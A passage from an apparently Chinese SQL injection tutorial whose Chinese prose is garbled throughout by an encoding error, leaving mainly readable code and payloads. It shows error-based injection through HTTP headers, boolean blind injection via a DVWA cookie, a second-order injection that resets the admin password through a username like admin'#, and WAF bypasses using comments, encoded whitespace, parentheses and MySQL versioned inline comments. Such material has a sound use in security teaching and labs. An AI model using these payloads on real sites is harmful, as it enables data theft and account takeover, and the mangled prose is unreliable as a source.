<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">GET</span> <span style="color:#e06c75">/analytics.php</span> <span style="color:#c678dd">HTTP</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">Host</span><span style="color:#56b6c2">:</span> vulnerable-site.com
</span></span><span style="display:flex;"><span><span style="color:#e06c75">User-Agent</span><span style="color:#56b6c2">:</span> Mozilla/5.0&#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &#39;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">X-Forwarded-For</span><span style="color:#56b6c2">:</span> 127.0.0.1&#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &#39;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">Referer</span><span style="color:#56b6c2">:</span> http://google.com&#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &#39;
</span></span></code></pre></div><p>æ–¹å¼å’Œæ™®é€šæ³¨å…¥éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œæ ¸å¿ƒæ€æƒ³æ²¡å˜ï¼Œ<strong>åªæ˜¯æ³¨æ„æœ€å¥½ä½¿ç”¨<code>''</code>é—­åˆååŠéƒ¨åˆ†</strong></p>
<h3 id="cookieæ³¨å…¥">cookieæ³¨å…¥
</h3><p>ä»åŸç†ä¸Šæ¥è¯´ï¼Œcookieæ³¨å…¥å’Œå…¶ä»–çš„æ³¨å…¥æ–¹å¼å¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒï¼Œåªæ˜¯æ³¨å…¥çš„åœ°ç‚¹ä¸åŒ</p>
<p><strong>æˆ‘ä»¬æ—¢å¯ä»¥åƒä¸Šé¢çš„å¤´éƒ¨å‚æ•°ä¸€æ ·æŠ“åŒ…ä¿®æ”¹cookieï¼Œä¹Ÿèƒ½åœ¨æœ¬åœ°ä¿®æ”¹cookieè¾¾åˆ°æ³¨å…¥ç›®çš„</strong></p>
<p>ä»¥dvwaé¶åœºhighç­‰çº§çš„sqlç›²æ³¨ä¸ºä¾‹ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹æºç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span>( <span style="color:#e06c75">isset</span>( <span style="color:#e06c75">$_COOKIE</span>[ <span style="color:#98c379">&#39;id&#39;</span> ] ) ) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_COOKIE</span>[ <span style="color:#98c379">&#39;id&#39;</span> ];
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$getid</span>  <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span style="color:#98c379">$id</span><span style="color:#98c379">&#39; LIMIT 1;&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$GLOBALS</span>[<span style="color:#98c379">&#34;___mysqli_ston&#34;</span>],  <span style="color:#e06c75">$getid</span> );
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$num</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">@</span><span style="color:#e06c75">mysqli_num_rows</span>( <span style="color:#e06c75">$result</span> ); 
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span>( <span style="color:#e06c75">$num</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#d19a66">0</span> ) {
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">echo</span> <span style="color:#98c379">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">0</span>, <span style="color:#d19a66">5</span> ) <span style="color:#56b6c2">==</span> <span style="color:#d19a66">3</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">sleep</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">2</span>, <span style="color:#d19a66">4</span> ) );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">header</span>( <span style="color:#e06c75">$_SERVER</span>[ <span style="color:#98c379">&#39;SERVER_PROTOCOL&#39;</span> ] <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#39; 404 Not Found&#39;</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">echo</span> <span style="color:#98c379">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ((<span style="color:#e06c75">is_null</span>(<span style="color:#e06c75">$___mysqli_res</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_close</span>(<span style="color:#e06c75">$GLOBALS</span>[<span style="color:#98c379">&#34;___mysqli_ston&#34;</span>]))) <span style="color:#56b6c2">?</span> <span style="color:#c678dd">false</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">$___mysqli_res</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>dvwaæä¾›äº†ä¸€ä¸ªä¿®æ”¹idçš„å…¥å£ï¼Œè€Œè¿™ä¸ªidå°±æ˜¯è¿™ä¸ªé¡µé¢çš„ä¸€ä¸ªcookie</p>
<p>åœ¨æ‹¿åˆ°æˆ‘ä»¬è¾“å…¥çš„idå€¼åï¼Œå®ƒæ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ’å…¥äº†sqlè¯­å¥ä¸­ï¼Œå°±åƒæ™®é€šçš„sqlæ³¨å…¥ç‚¹ä¸€æ ·</p>
<p>æˆ‘ä»¬ç‚¹å‡»é“¾æ¥æ›´æ¢æ–°cookieï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length(database())=4 #
</span></span></code></pre></div><p><strong>åˆ·æ–°é¡µé¢</strong>ï¼Œé¡µé¢æ˜¾ç¤º<code>User ID exists in the database.</code>ï¼Œè¯´æ˜æŸ¥è¯¢æˆåŠŸäº†ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åº“åç§°é•¿åº¦ä¸º4</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™æ®µä»£ç é‡Œè¿˜æœ‰è¿™æ ·çš„ä¸€æ®µï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#c678dd">if</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">0</span>, <span style="color:#d19a66">5</span> ) <span style="color:#56b6c2">==</span> <span style="color:#d19a66">3</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">sleep</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">2</span>, <span style="color:#d19a66">4</span> ) );
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p><strong>é¡µé¢æ¯æ¬¡éƒ½ä¼šè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœéšæœºæ•°æ˜¯3ï¼Œå°±å»¶è¿Ÿ2-4ç§’ï¼Œå®Œå…¨å¹²æ‰°äº†æ—¶é—´ç›²æ³¨ï¼Œè¿«ä½¿æˆ‘ä»¬åªèƒ½ä½¿ç”¨å¸ƒå°”ç›²æ³¨</strong></p>
<p>å®æˆ˜ä¸­å¯¹æ–¹å¯èƒ½å¹¶ä¸ä¼šæš´éœ²cookieä¿®æ”¹çš„ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æµè§ˆå™¨è‡ªå¸¦çš„å¼€å‘è€…å·¥å…·ï¼Œæˆ–è€…æµè§ˆå™¨æ‰©å±•</p>
<p><strong>f12å¼€å‘è€…å·¥å…·ï¼ˆåº”ç”¨ -&gt; cookieï¼‰ï¼š</strong></p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250701200225693" href="http://picture.928330.xyz/typora/image-20250701200225693.png">
<img src="http://picture.928330.xyz/typora/image-20250701200225693.png" alt="image-20250701200225693"  />
</a>
</div>
</p>
<p><strong>æµè§ˆå™¨æ‰©å±•ï¼ˆæ¯”å¦‚cookie editorï¼‰ï¼š</strong></p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250701200301860" href="http://picture.928330.xyz/typora/image-20250701200301860.png">
<img src="http://picture.928330.xyz/typora/image-20250701200301860.png" alt="image-20250701200301860"  />
</a>
</div>
</p>
<h2 id="8-äºŒæ¬¡æ³¨å…¥">#8 äºŒæ¬¡æ³¨å…¥
</h2><p>äºŒæ¬¡æ³¨å…¥æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒç”¨äºå®¡æŸ¥éå¸¸ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œä¸æ˜¯çªƒå–æ•°æ®ï¼Œè€Œæ˜¯ç¯¡æ”¹æ•°æ®</p>
<p>æˆ‘ä»¬æ¥çœ‹è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šæœ‰ä¸€ä¸ªç½‘ç«™å…è®¸ç”¨æˆ·æ³¨å†Œè´¦å·ï¼Œä¹‹åå¯ä»¥åœ¨ä¸ªäººä¸­å¿ƒä¿®æ”¹è‡ªå·±çš„å¯†ç </p>
<p><strong>ç”¨æˆ·æ³¨å†Œçš„phpï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$username</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$username_escaped</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">addslashes</span>(<span style="color:#e06c75">$username</span>); 
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;INSERT INTO users (username, password) VALUES (&#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$username_escaped</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;, &#39;some_password_hash&#39;)&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql</span>);
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>å¼€å‘è€…ä½¿ç”¨äº†<code>addslashes</code>å¯¹è¾“å…¥è¿›è¡Œè½¬ä¹‰ï¼Œè¿‡æ»¤äº†å¯èƒ½çš„å±é™©è¯­å¥</p>
<p><strong>ä¿®æ”¹å¯†ç çš„phpï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$current_user</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SESSION</span>[<span style="color:#98c379">&#39;username&#39;</span>]; 
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$new_password</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;new_password&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;UPDATE users SET password = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$new_password</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39; WHERE username = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$current_user</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>å¼€å‘è€…è§‰å¾—ä»æ•°æ®åº“é‡Œé¢å–å‡ºçš„æ•°æ®ç»å¯¹æ­£ç¡®ï¼Œäºæ˜¯æ²¡æœ‰å¯¹å®ƒåšä»»ä½•å¤„ç†</p>
<p>ç°åœ¨æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç”¨æˆ·åå«ï¼š<code>admin'#</code>ï¼Œå‡è®¾è¿™ä¸ªç½‘ç«™ç®¡ç†å‘˜è´¦å·å«<code>admin</code>ï¼Œè·Ÿæˆ‘ä»¬è¾“å…¥çš„åç§°å¾ˆåƒå§</p>
<p>ç»è¿‡æ³¨å†Œç¨‹åºçš„æ£€æŸ¥ï¼Œè¿™ä¸ªåç§°æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œäºæ˜¯æ”¾è¿›äº†æ•°æ®åº“</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªè´¦å·çš„å¯†ç ä¸º123ï¼Œæ•°æ®åº“è‡ªä¿¡åœ°å–å‡ºè¿™ä¸ªè´¦å·åç§°æ”¾åœ¨sqlè¯­å¥é‡Œ</p>
<p>è¿™æ—¶ï¼Œsqlè¯­å¥å°±å˜æˆäº†ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">UPDATE</span> <span style="color:#e06c75">users</span> <span style="color:#e06c75">SET</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;new_password&#39;</span> <span style="color:#e06c75">WHERE</span> <span style="color:#e06c75">username</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin&#39;</span><span style="color:#7f848e">#&#39;
</span></span></span></code></pre></div><p><strong>å› ä¸º#çš„æ³¨é‡Šï¼Œæˆ‘ä»¬ç«Ÿç„¶ç›´æ¥ä¿®æ”¹äº†adminè´¦å·çš„å¯†ç ï¼</strong></p>
<p>å¥½å•¦ï¼Œè¿™ä¸‹æˆ‘ä»¬å¯ä»¥éšæ„ç™»å½•ç®¡ç†å‘˜çš„è´¦å·å•¦~</p>
<h1 id="ç»•è¿‡waf">ç»•è¿‡WAF
</h1><p>ä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œè®¸å¤šç¨‹åºåº”ç”¨éƒ½ä¼šè®¾ç½®å„ç§å„æ ·çš„è¿‡æ»¤é˜²æŠ¤æ¡ä»¶â€”â€”Webåº”ç”¨é˜²ç«å¢™(WAF)</p>
<p>ä½œä¸ºæ”»å‡»è€…çš„æˆ‘ä»¬ï¼Œå°±éœ€è¦æƒ³åŠæ³•ç»•è¿‡è¿™äº›æ¡ä»¶ï¼Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„</p>
<h2 id="1-ç©ºæ ¼è¿‡æ»¤ç»•è¿‡">#1 ç©ºæ ¼è¿‡æ»¤ç»•è¿‡
</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œsqlè¯­å¥é‡Œé¢å­˜åœ¨ç€å¤§é‡çš„ç©ºæ ¼ï¼Œè€Œæœ‰äº›WAFä¼šç›´æ¥æŠŠç©ºæ ¼åŠ å…¥é»‘åå•ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">str_replace</span>(<span style="color:#98c379">&#39; &#39;</span>, <span style="color:#98c379">&#39;&#39;</span>,  <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT user, password FROM users WHERE user_id = &#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id_sanitized</span>;
</span></span></code></pre></div><p>å®ƒä¼šç›´æ¥æŠŠç”¨æˆ·è¾“å…¥å†…å®¹ä¸­çš„ç©ºæ ¼ç§»é™¤ï¼Œç„¶åå†æ‹¼æ¥è¿›å»</p>
<p>ä½†æ˜¯ï¼Œç©ºæ ¼æœ‰å¾ˆå¤šçš„ç»•è¿‡æ–¹å¼</p>
<h3 id="æ³¨é‡Šç»•è¿‡">æ³¨é‡Šç»•è¿‡
</h3><p>åœ¨å¤§å¤šæ•°çš„æ•°æ®åº“ï¼ˆç‰¹åˆ«æ˜¯mysqlï¼‰ä¸­ï¼Œ<strong>æ³¨é‡Š<code>/**/</code>èƒ½å¤Ÿä»£æ›¿ç©ºæ ¼</strong>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;/**/union/**/select/**/1,database()#
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250628203003878" href="http://picture.928330.xyz/typora/image-20250628203003878.png">
<img src="http://picture.928330.xyz/typora/image-20250628203003878.png" alt="image-20250628203003878"  />
</a>
</div>
</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œsqlè¯­å¥èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ</p>
<h3 id="urlç¼–ç ç»•è¿‡">urlç¼–ç ç»•è¿‡
</h3><p><strong>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨<code>+</code>ä»£æ›¿ç©ºæ ¼ï¼Œå› ä¸º<code>+</code>æ˜¯ç©ºæ ¼çš„ä¸€ç§urlæ ‡å‡†ç¼–ç å½¢å¼ï¼Œå¦‚æœä¸è¡Œï¼Œå°±è¦å¦å¯»ä»–æ³•äº†</strong></p>
<p>å¯¹äºå¤§å¤šæ•°æ•°æ®åº“æ¥è¯´ï¼Œå®ƒä»¬åœ¨è§£æSQLè¯­å¥æ—¶ï¼Œä¼šå°†å¤šç§ç©ºç™½å­—ç¬¦éƒ½è§†ä¸ºç©ºæ ¼ä¸€æ ·çš„åˆ†éš”ç¬¦ï¼ŒåŒ…æ‹¬ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>ç¬¦å·</th>
          <th>è¯´æ˜</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>%20</td>
          <td>æ™®é€šç©ºæ ¼</td>
      </tr>
      <tr>
          <td>%09</td>
          <td>TAB é”®(æ°´å¹³)</td>
      </tr>
      <tr>
          <td>%0a</td>
          <td>æ–°å»ºä¸€è¡Œ</td>
      </tr>
      <tr>
          <td>%0c</td>
          <td>æ–°çš„ä¸€é¡µ</td>
      </tr>
      <tr>
          <td>%0d</td>
          <td>return åŠŸèƒ½</td>
      </tr>
      <tr>
          <td>%0b</td>
          <td>TAB é”®(å‚ç›´)</td>
      </tr>
      <tr>
          <td>%a0</td>
          <td>ç©ºæ ¼ï¼ˆå’Œæ™®é€šç©ºæ ¼ä¸ä¸€æ ·ï¼‰</td>
      </tr>
  </tbody>
</table></div>
<p>è™½ç„¶è¿‡æ»¤äº†æ™®é€šç©ºæ ¼ï¼Œä½†æ˜¯å…¶ä»–çš„ç¬¦å·ä»ç„¶å¯ä»¥èµ·åˆ°ç©ºæ ¼ç›¸ç­‰çš„ä½œç”¨</p>
<p>åˆ¶è¡¨ç¬¦ç­‰éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨urlç¼–ç æ¥è¡¨ç¤ºä»–ä»¬ï¼Œæ¯”å¦‚ï¼š</p>
<pre tabindex="0"><code>1&#39;%0dunion%0dselect%0d1,database()#
</code></pre><h3 id="æ‹¬å·ç»•è¿‡">æ‹¬å·ç»•è¿‡
</h3><h4 id="æ•°å­—å‹">æ•°å­—å‹
</h4><p>mysqlæ•°æ®åº“æœ‰è¿™æ ·ä¸€ä¸ªç‰¹æ€§ï¼š</p>
<ul>
<li>
<p><mark><strong>åœ¨where id=1ååŠ ä¸Š=1ï¼Œå˜æˆwhere id=1=1ï¼Œæ„æ€æ˜¯æŸ¥è¯¢ç»“æœä¸å˜</strong></mark></p>
</li>
<li>
<p><mark><strong>åœ¨where id=1ååŠ ä¸Š=0ï¼Œå˜æˆwhere id=1=0ï¼Œæ„æ€æ˜¯æŸ¥è¯¢ç»“æœå–å</strong></mark></p>
</li>
</ul>
<p>ç»“åˆsubstring()ï¼Œæˆ‘ä»¬å°±èƒ½æ„é€ å‡ºä¸‹é¢çš„ä¸å¸¦æœ‰ç©ºæ ¼æ³¨å…¥ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1=(ascii(substring(database(),1,1))=100)
</span></span></code></pre></div><p><strong>å¦‚æœæ•°æ®åº“åç§°ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯dï¼Œé‚£ä¹ˆå°±ä¼šæ˜¯1=0ï¼Œå’Œæ­£å¸¸çš„è¾“å…¥1çš„ç»“æœæ˜¯å®Œå…¨ä¸åŒçš„</strong></p>
<p>è¿™ä¸ªæ€æƒ³å’Œç›²æ³¨å¼‚æ›²åŒå·¥ï¼Œä½†æ˜¯ä½ å¯èƒ½ä¹Ÿå‘ç°äº†ï¼Œä¸Šé¢çš„payloadåªé€‚ç”¨äºæ•°å­—å‹çš„æ³¨å…¥</p>
<h4 id="å­—ç¬¦å‹æ•°å­—å‹">å­—ç¬¦å‹&amp;æ•°å­—å‹
</h4><p>mysqlæ•°æ®åº“è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼š</p>
<ul>
<li><mark><strong>ä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥</strong></mark></li>
</ul>
<p>å¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨å­—ç¬¦å‹è¿›è¡Œç©ºæ ¼çš„æ‹¬å·ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨()æŠŠandåé¢çš„è¡¨è¾¾å¼åŒ…è£¹èµ·æ¥ï¼ˆå‰ææ˜¯æœ‰è¿”å›å€¼ï¼‰</p>
<p><strong>ä¸Šæ–‡æåˆ°çš„<code>sleep()</code>å‡½æ•°å…¶å®æ˜¯æœ‰è¿”å›å€¼çš„ï¼Œæ‰§è¡ŒæˆåŠŸä¸º1ï¼Œå¤±è´¥ä¸º0ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨()åŒ…è£¹ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;and(sleep((ascii(substring(database(),1,1))=100)+4))#
</span></span></code></pre></div><p><strong>è€Œif()å‡½æ•°çš„è¿”å›å€¼åˆ™å–å†³äºæˆ‘ä»¬å†™åœ¨ifé‡Œé¢çš„å‡½æ•°ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39;and(if(length(database())=4,sleep(5),1))#
</span></span></code></pre></div><p>æ•ˆæœå’Œæ—¶é—´ç›²æ³¨ç›¸åŒï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç”¨åœ¨å­—ç¬¦å‹ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨æ•°å­—å‹</p>
<p>å¦‚æœé€—å·è¢«è¿‡æ»¤ï¼Œä¸€èˆ¬ä¹Ÿè¦ä½¿ç”¨æ‹¬å·ç»•è¿‡ï¼š<a class="link" href="#%e7%bb%95%e8%bf%87%e5%87%bd%e6%95%b0%e5%8f%82%e6%95%b0%e4%b8%ad%e7%9a%84%e9%80%97%e5%8f%b7" >é€—å·ç»•è¿‡â€”â€”ç»•è¿‡å‡½æ•°å‚æ•°ä¸­çš„é€—å·
    
</a></p>
<h2 id="2-å†…è”æ³¨é‡Šç»•è¿‡">#2 å†…è”æ³¨é‡Šç»•è¿‡
</h2><h3 id="ç»•è¿‡ç‰¹å®šå±è”½è¯">ç»•è¿‡ç‰¹å®šå±è”½è¯
</h3><p><strong>ä¸ºäº†ä¿æŒå’Œå…¶ä»–æ•°æ®åº“çš„å…¼å®¹ï¼Œmysqlæ•°æ®åº“ä¼šæ‰§è¡Œæ”¾åœ¨<code>/*!...*/</code>é‡Œé¢çš„è¯­å¥</strong></p>
<p>è¿™æ ·ï¼Œå¦‚æœWAFé™åˆ¶äº†ä¸èƒ½ä½¿ç”¨ä¸€äº›æŸ¥è¯¢è¯­å¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå®ƒæ”¾åœ¨<code>/*!...*/</code>é‡Œï¼Œæ¯”å¦‚ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union/*!select*/ 1,2 #
</span></span></code></pre></div><p><strong>WAFä¼šæŠŠå®ƒçœ‹æˆ&quot;å¸¦æœ‰å¥‡æ€ªç¬¦å·çš„æ³¨é‡Š&quot;è€Œæ”¾è¡Œï¼Œä½†æ˜¯åˆ°äº†mysqlç¯å¢ƒé‡Œï¼Œå°±èƒ½è¢«æ‰§è¡Œï¼š</strong></p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250629194535907" href="http://picture.928330.xyz/typora/image-20250629194535907.png">
<img src="http://picture.928330.xyz/typora/image-20250629194535907.png" alt="image-20250629194535907"  />
</a>
</div>
</p>
<p><strong>æˆ‘ä»¬è¿˜å¯ä»¥åœ¨<code>/*!...*/</code>é‡Œé¢åŠ ä¸Šç‰ˆæœ¬å·ï¼š<code>/*!50001...*/</code>ï¼Œè¡¨ç¤ºæ•°æ®åº“æ˜¯5.00.01åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œè¯¥è¯­å¥æ‰ä¼šè¢«æ‰§è¡Œ</strong></p>
<p>æˆ‘ä½¿ç”¨çš„dvwaçš„mysqlç‰ˆæœ¬æ˜¯5.5.53ï¼Œå¦‚æœä½¿ç”¨<code>1' union/*!60001select*/ 1,2 #</code>ï¼Œå°±ä¼šæŠ¥ç‰ˆæœ¬é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1,2 #&#39;&#39; at line 1
</span></span></code></pre></div><h3 id="å¹²æ‰°wafè¿‡æ»¤">å¹²æ‰°WAFè¿‡æ»¤
</h3><p>æœ‰çš„WAFè¿‡æ»¤è¦†ç›–çš„èŒƒå›´å¯èƒ½ä¸å¤Ÿå¤§ï¼Œæ¯”å¦‚ä¼šè¿‡æ»¤æ‰<code>order by</code>ï¼Œä½†æ˜¯å¦‚æœåœ¨ä¸­é—´åŠ ä¸Š<code>/*!10440*/</code>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; or 1=1 order/*!10440*/by 1#
</span></span></code></pre></div><p>è¿™æ ·å¾ˆå¯èƒ½å°±èƒ½è®©WAFè¯†åˆ«é”™è¯¯ï¼Œå¦‚æœä¸€ä¸ªå†…è”æ³¨é‡Šä¸è¡Œï¼Œå°±å¤šæ¥å‡ ä¸ªï¼š</p>
<pre tabindex="0"><code class="language-texttext" data-lang="texttext">1&#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
</code></pre><p>æˆ–è€…å¹²è„†ä½¿ç”¨æ™®é€šçš„æ³¨é‡Šå¹²æ‰°ï¼š</p>
